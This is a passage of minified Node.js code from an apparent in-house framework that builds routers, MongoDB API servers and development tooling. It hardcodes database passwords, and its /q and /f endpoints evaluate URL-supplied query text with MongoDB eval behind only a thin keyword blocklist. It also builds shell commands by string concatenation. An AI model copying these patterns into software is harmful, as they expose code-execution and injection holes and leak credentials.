o=require("os").type().toUpperCase();try{i["__"+o](t,e)}catch(r){throw global.TtwLog.error("_addJSFiles_Package Error : "+r),r}};this.addJSFiles_Package=function(t,e){i(t,e)},i.__DARWIN=function(t,e){for(var o,a=STtwUtilFsReadStream.getList_Directory,i=a(t),_=0,n=i.length;n>_;++_)if(o=i[_],e[o])global.TtwLog.log("Ignore Folder Name : "+o);else{var l=t+o+"/",S=a(l);S.shift();for(var g=0,s=S.length;s>g;++g)r(l+S[g]+"/")}},i.__LINUX=i.__DARWIN,i.__WINDOWS=function(t,e){for(var o,a=STtwUtilFsReadStream.getList_Directory,i=a(t),_=0,n=i.length;n>_;++_)if(o=i[_],e[o])global.TtwLog.log("Ignore Folder Name : "+o);else{var l=t+o+"/",S=a(l);S.pop();for(var g=0,s=S.length;s>g;++g)r(l+S[g]+"/")}},i.__WINDOWS_NT=i.__WINDOWS;var _=function(t,e){global._$TATIC_VALUE_SERVER_HTTP_EVTS_REQUEST[t]=e};this.addRouter=function(t,e){_(t,e)};var n=function(t,e,o){for(var r,a=global._$TATIC_VALUE_SERVER_HTTP_EVTS_REQUEST=global._$TATIC_VALUE_SERVER_HTTP_EVTS_REQUEST||{},i=t,_=STtwUtilFsReadStream.getFile,n=Lib.Ttw.eval,l=STtwUtilFsReadStream.getList_File_Extension(i,".js"),S=0,g=l.length;g>S;++S){r=l[S];var s=n(_(i+r).toString("utf8"));if(!s||"function"!=typeof s)throw global.TtwLog.error("Router JS File Error : "+i+r),"Router JS File Error : "+i+r;a["/"+e+"/"+o+"/"+r.replace(".js","")]=s}};this.addRouter__JSFiles__Common=function(t,e,o){n(t,e,o)};var l=function(t){var e=t+"__define/";r(e);var o=require("os").type().toUpperCase();try{l["__"+o](t)}catch(a){throw global.TtwLog.error("_addRouter__JSFiles_Services Error : "+a),a}};return this.addRouter__JSFiles_Services=function(t){l(t)},l.__DARWIN=function(t){var e=STtwUtilFsReadStream.getList_Directory,o=e(t);o.shift();var r,a=0;for(var iLen=o.length;a<iLen;++a){r=o[a];for(var i,_=t+r+"/",l=e(_),S=0,g=l.length;g>S;++S)i=l[S],n(t+r+"/"+i+"/",r,i)}},l.__LINUX=l.__DARWIN,l.__WINDOWS=function(t){var e=STtwUtilFsReadStream.getList_Directory,o=e(t);o.pop();var r,a=0;for(var iLen=o.length;a<iLen;++a){r=o[a];for(var i,_=t+r+"/",l=e(_),S=0,g=l.length;g>S;++S)i=l[S],n(t+r+"/"+i+"/",r,i)}},l.__WINDOWS_NT=l.__WINDOWS,this}}();
global.TtwPackageNodeJS__CLASS__HTTPAPIServer_MongoDB=function(){var t=global,e=t.Lib.Ttw,r=e.CLASS;r.HTTPAPIServer=r.HTTPAPIServer||{},r.HTTPAPIServer.MongoDB=r.HTTPAPIServer.MongoDB||{},e.CLASS.HTTPAPIServer.MongoDB=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.httpAPIServer_MongoDB";var r=e.singleton(t.instanceKey,null);if(r)return r;this["package"]="global.Lib.Ttw.CLASS.HTTPAPIServer.MongoDB",this.server;var n=this,o="Ttw",_="thdtjsdncjswoQWEASDZXC",i="admin",u={host:t.mongodb.host,port:t.mongodb.port,id:o,pw:_,dbNm:i,cbFunction:t.cbFunction?t.cbFunction:null},l=function(){global._$TATIC_VALUE_SERVER_HTTP_EVTS_REQUEST?(global._$TATIC_VALUE_SERVER_HTTP_EVTS_REQUEST["/f"]=n.db_Req_Query_Func,global._$TATIC_VALUE_SERVER_HTTP_EVTS_REQUEST["/q"]=n.db_Req_Query):global._$TATIC_VALUE_SERVER_HTTP_EVTS_REQUEST={"/f":n.db_Req_Query_Func,"/q":n.db_Req_Query}};this.__addHTTPRequestEvent__f_q=function(){l()};var S=["admin","drop","kill","remove","shut","user"],a=S.length,s=function(t){t=t.toLowerCase();for(var e=0;a>e;++e)if(-1!=t.indexOf(S[e]))return!0;return!1};this.check__db_Req_Query=function(t){return s(t)};var v=function(t,e,r,n,o,_,i){t.eval(r.q,null,null,function(t,r){e.close(),i(t,r),n=null})};this.dbExec_cbFunc=function(t,e,r,n,o,_,i){v(t,e,r,n,o,_,i)};var c=function(t,e,r,n,o,_){t.eval(r.q,null,null,function(t,r){return e.close(),t?void STtwUtilHttpServer.evt_request__httpServer_200_False(o,_):(STtwUtilHttpServer.evt_request__httpServer_200_String(o,_,JSON.stringify(r)),void(n=null))})};this.dbExecF=function(t,e,r,n,o,_){c(t,e,r,n,o,_)};var T=function(t,e,r,n,o,_){t.eval("function(){"+r.q+"}",null,null,function(t,r){return e.close(),t?void STtwUtilHttpServer.evt_request__httpServer_200_False(o,_):(STtwUtilHttpServer.evt_request__httpServer_200_String(o,_,JSON.stringify(r)),void(n=null))})};this.dbExecQ=function(t,e,r,n,o,_){T(t,e,r,n,o,_)};var d=function(t,e){var r=STtwUtilHttpServer.getQueryFromURL(t.url);if(s(r.q))return void STtwUtilHttpServer.evt_request__httpServer_200_False(t,e);var o=g();o.cbFunction=function(_){var i=_.db,u=i.db(r.db);n.dbExecQ(u,i,r,o,t,e)},STtwUtilMongoDB.connectAndAuth(o)};this.db_Req_Query=function(t,e){d(t,e)};var b=function(t,e){var r=STtwUtilHttpServer.getQueryFromURL(t.url);if(s(r.q))return void STtwUtilHttpServer.evt_request__httpServer_200_False(t,e);var o=g();o.cbFunction=function(_){var i=_.db,u=i.db(r.db);n.dbExecF(u,i,r,o,t,e)},STtwUtilMongoDB.connectAndAuth(o)};this.db_Req_Query_Func=function(t,e){b(t,e)};var f=function(t,e,r,o){var _=g();_.cbFunction=function(i){var u=i.db,l=u.db(r.db);n.dbExec_cbFunc(l,u,r,_,t,e,o)},STtwUtilMongoDB.connectAndAuth(_)};this.req_DB=function(t,e,r,n){f(t,e,r,n)},this.sendResponse_200_False=function(t,e){STtwUtilHttpServer.evt_request__httpServer_200_False(t,e)},this.sendResponse_200_True=function(t,e){STtwUtilHttpServer.evt_request__httpServer_200_True(t,e)},this.sendResponse_200_String=function(t,e,r){STtwUtilHttpServer.evt_request__httpServer_200_String(t,e,r)};var g=function(){var t={};for(var e in u)t[e]=u[e];return t},h=function(t){return STtwUtilHttpServer.getQueryFromURL(t)};this.getQueryFromURL=function(t){return h(t)};var L=function(t){return STtwUtilURL.getParseResult(t)};return this.getURLParse=function(t){return L(t)},n.server=new global.Lib.Ttw.CLASS.Http.Server.HttpServer_API({instanceKey:this.instanceKey+"__HttpServer_API",requestMode:"api"}),n.server.listen(t.server.port,t.server.host),global.Lib.Ttw.autoLoad_JS||(global.Lib.Ttw.autoLoad_JS=new global.Lib.Ttw.CLASS.AutoLoad_JS({instanceKey:"global.Lib.Ttw.autoLoad_JS"})),global.Lib.Ttw.autoLoad_JS.addJSFiles___Define("./js/",{b2link_router:1}),global.Lib.Ttw.autoLoad_JS.addJSFiles_Package("./js/",{b2link_router:1}),global.Lib.Ttw.autoLoad_JS.addRouter__JSFiles_Services("./js/b2link_router/"),this.addRouter=global.Lib.Ttw.autoLoad_JS.addRouter,this}}();
global.TtwPackageNodeJS__FsWriteStream_Extension_Dev=function(){var t=global,e=t.Lib.Ttw;e.CLASS.FN.FsWriteStream_Extension_Dev=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnFsWriteStream_Extension_Dev";var r=e.singleton(t.instanceKey,null);if(r)return r;this["package"]="global.Lib.Ttw.fnFsWriteStream_Extension_Dev";var l=this,a=function(t,e,r){for(var l,i,o,n,g,s,_=STtwUtilFsWriteStream_Extension_Dev.create_CSS_FromLESS.o_Command,S=STtwUtilFsReadStream.getList_File_Extension,c=STtwUtilFsWriteStream.writeFile,T=STtwUtilFsReadStream.getFile,F=STtwUtilFsWriteStream.deleteFile,f=S(t,".less"),m=0,w=f.length;w>m;++m){s=f[m],n=s.replace(".less",""),g=n+".css",l=t+s,i=t+g,o=t+"tmp__"+s;var h=T(l);global.TtwLog.log("[ Read File    ] - "+l),c(o,r+"\n\n"+h),global.TtwLog.log("[ Create File  ] - "+o);try{var L=_.lessc+o+" > "+i;global.TtwLog.log("[ Convert File ] - "+o+" > "+i),global.TtwLog.log("[ CMD          ] - "+L),STtwUtilCP.sExec(L)}catch(u){global.TtwLog.error("_create_CSS_FromLESS Error : "+u),a._aErrorList.push(u)}F(o);var v=T(i).toString("utf8");c(e+g,v)}};a._aErrorList=[],this.create_CSS_FromLESS=function(t,e,r,l){l&&(a._aErrorList.length=0),a(t,e,r)},this.create_CSS_FromLESS.o_Command={lessc:"lessc "},this.create_CSS_FromLESS_SubDirectories=function(t,e,r){r&&(a._aErrorList.length=0),a(t,t,e);for(var i=l.create_CSS_FromLESS_SubDirectories,o=STtwUtilFsReadStream.getList_Directory(t),n=0,g=o.length;g>n;++n)i(t+o[n]+"/",e,r)};var i=function(t){try{var e=STtwUtilFsReadStream.getList_Directory(t);STtwUtilFsWriteStream.writeFile_JSON_Tab1_UTF8(t+"__listDir.json",e)}catch(r){global.TtwLog.error("_create_DirectoryAndFileList_JSON__CSS - DIR - Error : "+r)}try{var l=STtwUtilFsReadStream.getList_File_Extension(t,".css");STtwUtilFsWriteStream.writeFile_JSON_Tab1_UTF8(t+"__list.json",l)}catch(r){global.TtwLog.error("_create_DirectoryAndFileList_JSON__CSS - CSS - Error : "+r)}if(e)for(var a in e)e[a]=t+e[a]+"/";return e};this.create_DirectoryAndFileList_JSON__CSS=function(t){var e=i(t);if(e)for(var r in e)l.create_DirectoryAndFileList_JSON__CSS(e[r])};var o=function(t,e){var r=STtwUtilFsReadStream.getList_File_Extension,l=STtwUtilFsWriteStream.writeFile,a=STtwUtilFsReadStream.getList_Directory,i=a(t);l(t+"__list.json",JSON.stringify(i,null,"	"));for(var o=0,n=i.length;n>o;++o){var g=t+i[o]+"/",s=a(g),_=s.pop();l(g+"__define/__listPackage.json",JSON.stringify(s,null,"	")),s.unshift(_),l(g+"__list.json",JSON.stringify(s,null,"	"));var S,c=s,T=e+i[o]+".",F="",f=0,m=c.length;for(f;m>f;++f){F=T+c[f]+".",global.TtwLog.log("namespace : "+F),S=g+c[f]+"/";for(var w=r(S,".js"),h=0,L=w.length;L>h;++h)w[h]=w[h].replace(F,"").replace(".js",""),global.TtwLog.log("JS File Name : "+w[h]);l(S+"/__list.json",JSON.stringify(w,null,"	"))}}};this.create_DirectoryAndFileList_JSON__JS=function(t,e){o(t,e)};var n=function(t,e){var r=STtwUtilFsReadStream.getList_File_Extension,l=STtwUtilFsWriteStream.writeFile,a=STtwUtilFsReadStream.getList_Directory,i=a(t);l(t+"__list.json",JSON.stringify(i,null,"	"));for(var o=0,n=i.length;n>o;++o){var g=t+i[o]+"/",s=a(g),_=s.shift();l(g+"__define/__listPackage.json",JSON.stringify(s,null,"	")),s.unshift(_),l(g+"__list.json",JSON.stringify(s,null,"	"));var S,c=s,T=e+i[o]+".",F="",f=0,m=c.length;for(f;m>f;++f){F=T+c[f]+".",global.TtwLog.log("namespace : "+F),S=g+c[f]+"/";for(var w=r(S,".js"),h=0,L=w.length;L>h;++h)w[h]=w[h].replace(F,"").replace(".js",""),global.TtwLog.log("JS File Name : "+w[h]);l(S+"/__list.json",JSON.stringify(w,null,"	"))}}};this.create_DirectoryAndFileList_JSON__JS__Mac=function(t,e){n(t,e)};var g=function(t,e,r){for(var l=(STtwUtilFsReadStream.getList_File_Extension,STtwUtilFsWriteStream.writeFile),a=STtwUtilFsReadStream.getList_Directory,i=STtwUtilFsReadStream.checkWhetherFile,o=STtwUtilFsReadStream.getFile,n=a(t),g=/\<\!=name=\!\>/gi,s=/\<\!=key=\!\>/gi,_=o(e).toString("utf8"),S=0,c=n.length;c>S;++S){var T=t+n[S]+"/__define/",F=JSON.parse(o(T+"__listPackage.json")),f=_.replace(g,n[S]),m=T+"000_define_"+r+n[S]+".js";i(m)||l(m,f.replace(s,"").replace("..","").replace(". "," ").replace(".;","").replace(".;",""));for(var w=0,h=F.length;h>w;++w){var L=f.replace(s,F[w]);global.TtwLog.log("namespace : "+r+n[S]+"."+F[w]),m=T+"200_define_"+r+n[S]+"."+F[w]+".js",i(m)||l(m,L)}}};this.create_Package_Define__JS=function(t,e,r){g(t,e,r)};var s=function(t,e){var r=t.indexOf("<include-html>");if(-1==r)return t;var l=t.indexOf("</include-html>"),a=t.slice(r+14,l),i=a.replace("./",e),o=STtwUtilFsReadStream.getFile(i).toString("utf8");return t=t.replace("<include-html>"+a+"</include-html>",o),s(t,e)};this.create_HTMLFromTemplateHTML=function(t,e){return s(t,e)};var _=function(t,e,r,l){void 0==l&&(l=!0);var a;a=l?".thtml":".html";var i=STtwUtilFsReadStream.getFile,o=STtwUtilFsWriteStream.writeFile_UTF8,n=STtwUtilFsReadStream.checkWhetherFile,g=STtwUtilFsReadStream.getList_File_Extension(e,a);global.TtwLog.log("---------- Template HTML File List ----------"),global.TtwLog.log(g),global.TtwLog.log("---------- Template HTML File List ----------");var S=STtwUtilFsReadStream.getList_Directory(e);global.TtwLog.log("---------- Template HTML Directory List ----------"),global.TtwLog.log(S),global.TtwLog.log("---------- Template HTML Directory List ----------");for(var c,T,F,f,m=0,w=g.length;w>m;++m)if(f=g[m],F=e+f,T=F.replace(a,".html"),r)c=i(F).toString("utf8"),".html"==a&&(o(F.replace(".html",".thtml"),c),global.TtwLog.log("Create - "+F)),c=s(c,t),o(T,c),global.TtwLog.log("Create - "+T),global.TtwLog.log("");else{var h=n(T);if(h)continue;c=i(F).toString("utf8"),".html"==a&&(o(F.replace(".html",".thtml"),c),global.TtwLog.log("Create - "+F)),c=s(c,t),o(T,c),global.TtwLog.log("Create - "+T),global.TtwLog.log("")}for(m=0,w=S.length;w>m;++m)f=S[m],_(t,e+f+"/",r,l)};this.create_HTMLFromTemplateHTMLPath=function(t,e,r,l){_(t,e,r,l)};var S=function(t,e){var r=S,l=e.indexOf(r._k0),a=e.indexOf(r._k1);if(-1==l)return e;var i=e.slice(l+9,a),o=t.path_schema_include+i;global.TtwLog.log("path1 : "+o);var n=r._k0+i+r._k1;global.TtwLog.log("StringValue : "+n);var g=SUtilFsReadStream.getFile(o).toString("utf8");return e=e.replace(n,g),S(t,e)};S._k0="<include>",S._k1="</include>",this.create_JSONFromTemplateJSON=function(t,e){return S(t,e)};var c=function(t,e){for(var r=STtwUtilFsReadStream.getList_Directory(e),l=0,a=r.length;a>l;++l){var i=e+r[l]+"/";T(t,i)}};this.create_JSONsFromTemplateJSONs__Folder=function(t,e){c(t,e)};var T=function(t,e){var r=SUtilFsReadStream.getFile,l=SUtilFsWriteStream.writeFile_UTF8;global.TtwLog.log("path : "+e),c(t,e);for(var a,i=STtwUtilFsReadStream.getList_File_Extension(e,t.template_extension),o=0,n=i.length;n>o;++o){a=i[o],global.TtwLog.log("\n");var g=e+a;global.TtwLog.log("path_tjson : "+g);var s=g.replace(t.path_schema_template,t.path_schema);s=s.replace(t.template_extension,t.extension),global.TtwLog.log("path_json : "+s);var _=r(g).toString("utf8");_=S(t,_),l(s,_),global.TtwLog.log("[ Create File ] - "+s+" - JSON NoCheck"),_=_.replace(/\/\*.+?\*\/|\/\/.*(?=[\n\r])/g,"");var T=JSON.parse(_);_=JSON.stringify(T,function(t,e){return("values"==t||"valuesMap"==t)&&(e=JSON.stringify(e)),"string"!=typeof e&&e.hasOwnProperty("length")&&"array"==e.type&&(e=JSON.stringify(e)),e},"	"),_=_.replace(/\\\"/gi,'"'),_=_.replace(/\"\{/gi,"{"),_=_.replace(/\}\"/gi,"}"),_=_.replace(/\"\[/gi,"["),_=_.replace(/\]\"/gi,"]"),l(s,_),global.TtwLog.log("[ Create File ] - "+s+" - JSON Check")}};this.create_JSONsFromTemplateJSONs__Path=function(t,e){T(t,e)};var F=function(t){for(var e={};;){var r=t.indexOf("((");if(-1==r)break;var l=t.indexOf("))"),a=t.slice(r+2,l);e[a]="aaaaa",t=t.replace("(("+a+"))","")}return e};this.create_TemplateJSON_FromHTML=function(t){return F(t)};var f=function(t,e,r){global.TtwLog.log("path : "+t),e=e?e:".html";for(var l,a=STtwUtilFsReadStream.getFile,i=STtwUtilFsWriteStream.writeFile_JSON_Tab1_UTF8,o=STtwUtilFsReadStream.checkWhetherFile,n=STtwUtilFsWriteStream_Extension_Dev.create_TemplateJSON_FromHTMLDirectory._a_countryCD,g=n.length,s=STtwUtilFsReadStream.getList_File_Extension(t,e),_=0,S=s.length;S>_;++_){l=s[_];var c=l.replace(e,"");if(r)for(var T,f=F(a(t+l).toString("utf8")),m=0;g>m;++m)T=t+c+".locale."+n[m]+".json",i(T,f),global.TtwLog.log("[ Create File Overwrite ] - "+T);else if(null==o(t+c+".locale.kr.json"))for(var T,f=F(a(t+l).toString("utf8")),m=0;g>m;++m)T=t+c+".locale."+n[m]+".json",i(T,f),global.TtwLog.log("[ Create File New ] - "+T)}};this.create_TemplateJSON_FromHTMLDirectory=function(t,e,r){f(t,e,r)},this.create_TemplateJSON_FromHTMLDirectory._a_countryCD=["cn","kr","us"];var m=function(t,e,r){global.TtwLog.log("path : "+t),f(t,e,r);var l=STtwUtilFsReadStream.getList_Directory(t),a=0,i=l.length;if(i)for(;i>a;++a)m(t+l[a]+"/",e,r)};this.create_TemplateJSON_FromHTMLDirectory__SubDirectories=function(t,e,r){m(t,e,r)};var w=function(t,e,r){global.TtwLog.log("path : "+t),e=e?e:".html";for(var l,a=STtwUtilFsReadStream.getFile,i=STtwUtilFsWriteStream.writeFile_JSON_Tab1_UTF8,o=STtwUtilFsReadStream.checkWhetherFile,n=F,g=STtwUtilFsWriteStream_Extension_Dev.create_TemplateJSON_FromHTMLDirectory._a_countryCD,s=g.length,_=STtwUtilFsReadStream.getList_File_Extension(t,e),S=0,c=_.length;c>S;++S){l=_[S];var T=l.replace(e,"");if(r)for(var f,m=n(a(t+l).toString("utf8")),w=0;s>w;++w)f=t+T+".locale."+g[w]+".json",i(f,m),global.TtwLog.log("[ Create File Overwrite ] - "+f);else if(null==o(t+T+".locale.kr.json"))for(var f,m=n(a(t+l).toString("utf8")),w=0;s>w;++w)f=t+T+".locale."+g[w]+".json",i(f,m),global.TtwLog.log("[ Create File New ] - "+f);else{var m=n(a(t+l).toString("utf8")),h=0;f=t+T+".locale."+g[0]+".json";var L=JSON.parse(a(f).toString("utf8"));for(var u in m)if(!L[u]){h=1;break}if(0==h)return;for(var f,w=0;s>w;++w){f=t+T+".locale."+g[w]+".json";var L=JSON.parse(a(f).toString("utf8"));for(u in L)m[u]=L[u];i(f,m),global.TtwLog.log("[ Create File New ] - "+f)}}}};this.create_TemplateJSON_FromHTMLDirectory__CheckOriginalJSON=function(t,e,r){w(t,e,r)};var h=function(t,e,r){global.TtwLog.log("path : "+t),w(t,e,r);var l=STtwUtilFsReadStream.getList_Directory(t),a=0,i=l.length;if(i)for(;i>a;++a)h(t+l[a]+"/",e,r)};this.create_TemplateJSON_FromHTMLDirectory__SubDirectories__CheckOriginalJSON=function(t,e,r){h(t,e,r)};var L=function(t,e){var r=L,l=e.indexOf(r._k0),a=e.indexOf(r._k1);if(-1==l)return e;var i=e.slice(l+9,a),o=t.path_schema_include+i;global.TtwLog.log("path1 : "+o);var n=r._k0+i+r._k1;global.TtwLog.log("StringValue : "+n);var g=SUtilFsReadStream.getFile(o).toString("utf8");return e=e.replace(n,g),L(t,e)};L._k0="<include>",L._k1="</include>",this.create_File_FromTemplateFile=function(t,e){return L(t,e)};var u=function(t,e){for(var r=STtwUtilFsReadStream.getList_Directory(e),l=0,a=r.length;a>l;++l){var i=e+r[l]+"/";v(t,i)}};this.create_Files_FromTemplateFiles__Folder=function(t,e){u(t,e)};var v=function(t,e){global.TtwLog.log("\n"),global.TtwLog.log("\n"),global.TtwLog.log("\n"),global.TtwLog.log("\n"),global.TtwLog.log("\n");var r=SUtilFsReadStream.getFile,l=SUtilFsWriteStream.writeFile_UTF8;global.TtwLog.log("path : "+e),u(t,e);for(var a,i=STtwUtilFsReadStream.getList_File_Extension(e,t.template_extension),o=0,n=i.length;n>o;++o){a=i[o],global.TtwLog.log("\n");var g=e+a;global.TtwLog.log("path_tjson : "+g);var s=g.replace(t.path_schema_template,t.path_schema);s=s.replace(t.template_extension,t.extension),global.TtwLog.log("path_json : "+s);var _=r(g).toString("utf8");_=L(t,_),l(s,_),global.TtwLog.log("[ Create File ] - "+s+" - JSON NoCheck")}};this.create_JSONsFromTemplateJSONs__Path=function(t,e){v(t,e)}}}();
global.TtwPackageNodeJS__FsWriteStream_Extension_Dev__MongoDB=function(){var e=global,_=e.Lib.Ttw;_.CLASS.FN.FsWriteStream_Extension_Dev__MongoDB=function(e){this.instanceKey=e.instanceKey||"global.Lib.Ttw.fnFsWriteStream_Extension_Dev__MongoDB";var t=_.singleton(e.instanceKey,null);if(t)return t;this["package"]="global.Lib.Ttw.fnFsWriteStream_Extension_Dev__MongoDB";var r=this;this.datas={FILE_NM__DB_SYSTEM_JS_REMOVE:"_db.system.js.remove.js",FILE_NM__CREATE_DB_AND_USER:"_create_DB_And_User",NM_FRONT_DBNM:'"b2link_',PATH_BIN_ADMIN:"execute_mongoclient_js__admin ",PATH_BIN_DATABASE:"execute_mongoclient_js__database ",PASSWORD_R:"_r_qlxnfldzmdkfEjqmffb!",PASSWORD_RW:"_rw_qlxnfldzmdkfEjqmffb!"};var i=function(e){var _=r;_.createJSON__List__DBs(e);for(var t,i=STtwUtilFsReadStream.getList_Directory(e),a=0,n=i.length;n>a;++a){t=i[a],_.fileSave_dbjs_createDBAndUser(t,e),_.fileSave_dbjs_removeAllProcedure(t,e);var o=e+t+"/";_.exec_mongo__CreateDBAndUser(t,o),_.exec_mongo__DB_JS_Remove(t,o),_.build__addProcedure__Database(o,t)}};this.build__all=function(e){i(e)};var a=function(e,_,t){var i=r,a=STtwUtilFsReadStream.getFile,n=STtwUtilFsWriteStream.writeFile;try{var o=STtwUtilFsReadStream.getList_File_Extension(e,".js")}catch(s){global.TtwLog.error("Error : "+s);var o=[]}for(var S,l=0,d=o.length;d>l;++l){S=o[l];var c=e+S,D=c+".dbs",A=S.replace(".js",""),E=a(c).toString("utf8");E=i.createJS__addJS(_,t,A,E),n(D,E),i.exec_mongo__AddProcedure(_,D)}};this.build__addProcedure__Collection=function(e,_,t){a(e,_,t)};var n=function(e,_){var t=STtwUtilFsReadStream.getList_Directory(e);t.unshift(t.pop());for(var r,i=(STtwUtilFsReadStream.getFile,STtwUtilFsWriteStream.writeFile,0),a=t.length;a>i;++i){r=t[i];var n=e+r+"/";SUtilFsWriteStream_Extension_Dev__MongoDB.build__addProcedure__Collection(n,_,r)}};this.build__addProcedure__Database=function(e,_){n(e,_)};var o=function(e){var _=r;_.createJSON__List__DBs(e);for(var t,i=STtwUtilFsReadStream.getList_Directory(e),a=0,n=i.length;n>a;++a){t=i[a],_.fileSave_dbjs_createDBAndUser(t,e);var o=e+t+"/";_.exec_mongo__CreateDBAndUser(t,o)}};this.build__createDBsAndUsers=function(e){o(e)};var s=function(e){for(var _,t=r,i=STtwUtilFsReadStream.getList_Directory(e),a=0,n=i.length;n>a;++a){_=i[a],t.fileSave_dbjs_removeAllProcedure(_,e);var o=e+_+"/";t.exec_mongo__DB_JS_Remove(_,o)}};this.build__removeAllProcedure=function(e){s(e)};var S=function(e,_,t,r){var i='db.getSiblingDB( "'+e+'" ).addJSFunc( "';return"_common_procedure"==_||(t=_+"$"+t),i+t+'", '+r+" );"};this.createJS__addJS=function(e,_,t,r){return S(e,_,t,r)};var l=function(e){var _=STtwUtilFsReadStream.getList_Directory(e);STtwUtilFsWriteStream.writeFile(e+"__list.json",JSON.stringify(_,null,"	"))};this.createJSON__List__DBs=function(e){l(e)};var d=function(e,_){var t=r.datas,i=t.NM_FRONT_DBNM,a=i+e,n=a+'_rw"',o=a+t.PASSWORD_RW+'"',s=t.PATH_BIN_DATABASE+e+" "+n+" "+o+" "+_+" > "+_+".result",S=require("os").type().toUpperCase();-1!=S.indexOf("DARWIN")&&(s=s.replace(/\$/gi,"\\$")),-1!=S.indexOf("Linux")&&(s=s.replace(/\$/gi,"\\$"));try{var l=STtwUtilCP.sExec(s),d=l.indexOf("error");d>-1&&(global.TtwLog.error(l),STtwUtilFsWriteStream.writeFile(_+".errorResult",l))}catch(c){global.TtwLog.error("er : "+c)}};this.exec_mongo__AddProcedure=function(e,_){d(e,_)};var c=function(e,_){var t=r.datas,i=t.FILE_NM__CREATE_DB_AND_USER+".dbjs",a=_+i,n=t.PATH_BIN_ADMIN+a+" > "+a+".result";try{var o=STtwUtilCP.sExec(n),s=o.indexOf("error");s>-1&&(global.TtwLog.error(o),SUtilFsWriteStream.writeFile(a+".errorResult",o))}catch(S){global.TtwLog.error(S)}};this.exec_mongo__CreateDBAndUser=function(e,_){c(e,_)};var D=function(e,_){var t=r.datas,i=t.NM_FRONT_DBNM,a=i+e+'_rw"',n=i+e+t.PASSWORD_RW+'"',o=t.PATH_BIN_DATABASE+e+" "+a+" "+n+" "+_+t.FILE_NM__DB_SYSTEM_JS_REMOVE+".dbjs > "+_+t.FILE_NM__DB_SYSTEM_JS_REMOVE+".dbjs.result";try{STtwUtilCP.sExec(o)}catch(s){global.TtwLog.error("exec_mongo__DB_JS_Remove Error : "+s)}};this.exec_mongo__DB_JS_Remove=function(e,_){D(e,_)};var A=function(e,_){var t=r.datas,i=t.NM_FRONT_DBNM,a=i+e,n=a+'_r"',o=a+'_rw"',s=a+t.PASSWORD_R+'"',S=a+t.PASSWORD_RW+'"',l='\nvar db0 = db.getSiblingDB( "'+e+'" );\ndb0.createUser({ user : '+n+", pwd : "+s+', roles : [ "dbOwner", "read" ] });\ndb0.createUser({ user : '+o+", pwd : "+S+', roles : [ "dbOwner", "readWrite" ] });';STtwUtilFsWriteStream.writeFile(_+e+"/"+t.FILE_NM__CREATE_DB_AND_USER+".dbjs",l)};A.__nm_front_dbNm='"b2link_',this.fileSave_dbjs_createDBAndUser=function(e,_){A(e,_)};var E=function(e,_){var t='try{ db.getSiblingDB( "'+e+'" ).system.js.remove({}); }\ncatch( er ){ print( er ); }';STtwUtilFsWriteStream.writeFile(_+e+"/"+r.datas.FILE_NM__DB_SYSTEM_JS_REMOVE+".dbjs",t)};this.fileSave_dbjs_removeAllProcedure=function(e,_){E(e,_)},this.setData=function(e){var _=r.datas;_.FILE_NM__DB_SYSTEM_JS_REMOVE=e.FILE_NM__DB_SYSTEM_JS_REMOVE?e.FILE_NM__DB_SYSTEM_JS_REMOVE:"_db.system.js.remove.js",_.FILE_NM__CREATE_DB_AND_USER=e.FILE_NM__CREATE_DB_AND_USER?e.FILE_NM__CREATE_DB_AND_USER:"_create_DB_And_User",_.NM_FRONT_DBNM=e.NM_FRONT_DBNM?e.NM_FRONT_DBNM:'"b2link_',_.PATH_BIN_ADMIN=e.PATH_BIN_ADMIN?e.PATH_BIN_ADMIN:"execute_mongoclient_js__admin ",_.PATH_BIN_DATABASE=e.PATH_BIN_DATABASE?e.PATH_BIN_DATABASE:"execute_mongoclient_js__database ",_.PASSWORD_R=e.PASSWORD_R?e.PASSWORD_R:"_r_qlxnfldzmdkfEjqmffb!",_.PASSWORD_RW=e.PASSWORD_RW?e.PASSWORD_RW:"_rw_qlxnfldzmdkfEjqmffb!"}}}();
global._$TATIC_CONST_DEBUG=global._$TATIC_CONST_DEBUG||!1,global.TtwLog=global.TtwLog||null,global.TtwPackageNodeJS__Local_GDALMongoDB=function(){var t=global,e=t.Lib.Ttw;e.CLASS.FN.MongoDB=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnMongoDB";var o=e.singleton(t.instanceKey,null);if(o)return o;this["package"]="global.Lib.Ttw.fnMongoDB";var n=this;n._mongodb={},this.connectAndAuth=function(t){function e(e,o){e||t.cbFunction&&t.cbFunction({db:i})}function o(o,n){if(o)throw o;i=n;var r={id:t.id,pw:t.pw,options:null};STtwUtilMongoDBDB.authenticate(i,r,e)}var i,r=n.mongodb,l=STtwUtilMongoDB.getUrl(t.host,t.port,t.dbNm);r.MongoClient.connect(l,o)},this.connectAndAuth_Collection=function(t){function e(e,o){e||(r=i.collection(t.colNm),t.cbFunction&&t.cbFunction({db:i,collection:r}))}function o(o,n){if(o)throw o;i=n;var r={id:t.id,pw:t.pw,options:null};STtwUtilMongoDBDB.authenticate(i,r,e)}var i,r,l=n.mongodb,s=STtwUtilMongoDB.getUrl(t.host,t.port,t.dbNm);l.MongoClient.connect(s,o)},this.consoleLog__Status=function(t){var e=console.log;e("t.BaseCommand : "+t.BaseCommand()),e("t.Binary : "+t.Binary()),e("t.Chunk : "+t.Chunk()),e("t.Code : "+t.Code()),e("t.DBRef : "+t.DBRef()),e("t.Double : "+t.Double()),e("t.Grid : "+t.Grid()),e("t.Long : "+t.Long()),e("t.MaxKey : "+t.MaxKey()),e("t.MinKey : "+t.MinKey()),e("t.MongoClient : "+t.MongoClient()),e("t.ObjectID : "+t.ObjectID()),e("t.ReadPreference : "+t.ReadPreference()),e("t.Server : "+t.Server()),e("t.Symbol : "+t.Symbol()),e("t.Timestamp : "+t.Timestamp()),e("t.native : "+t["native"]()),e("t.pure : "+t.pure()),e("t.version : "+t.version)},this.NewServer=function(t,e,o,i){var r=n.mongodb;try{return null==o&&i&&(o={logger:{debug:function(t,e){},error:function(t,e){},log:function(t,e){}}}),new r.Server(t,e,o)}catch(l){return l}},this.getUrl=function(t,e,o){return"mongodb://"+t+":"+e+"/"+o}},e.CLASS.FN.MongoDBCollection=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnMongoDBCollection";var o=e.singleton(t.instanceKey,null);return o?o:(this["package"]="global.Lib.Ttw.fnMongoDBCollection",this.evt_Complete_Count=function(t,e){t?STtwUtilHttpServer.evt_request__httpServer_422(req,res,t.name+" "+t.code+" : 